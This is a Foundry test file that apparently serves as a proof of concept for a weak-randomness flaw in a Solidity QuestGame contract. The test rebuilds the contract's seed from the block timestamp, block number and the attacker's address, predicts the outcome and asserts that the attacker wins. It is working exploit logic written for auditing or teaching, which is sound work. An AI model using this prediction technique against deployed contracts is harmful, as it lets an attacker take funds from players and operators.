
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {
    QuestGame game;

    function setUp() public {
        game = new QuestGame{value: 10 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp > 0);
        vm.assume(blockTimestamp < type(uint64).max);
        vm.assume(blockNumber > 1);
        vm.assume(blockNumber < type(uint64).max);

        address attacker = address(0xBEEF);
        vm.deal(attacker, 1 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    blockTimestamp,
                    blockNumber,
                    attacker
                )
            )
        );

        uint256 predictedNumber = seed % 100;

        vm.prank(attacker);
        game.attemptQuest{value: game.ENTRY_FEE()}(predictedNumber);

        (uint256 exp, uint256 wins) = game.getPlayerStats(attacker);

        assertEq(wins, 1, "Attacker should win by predicting the random number");
        assertEq(exp, 100, "Attacker should gain experience from the win");
    }
}
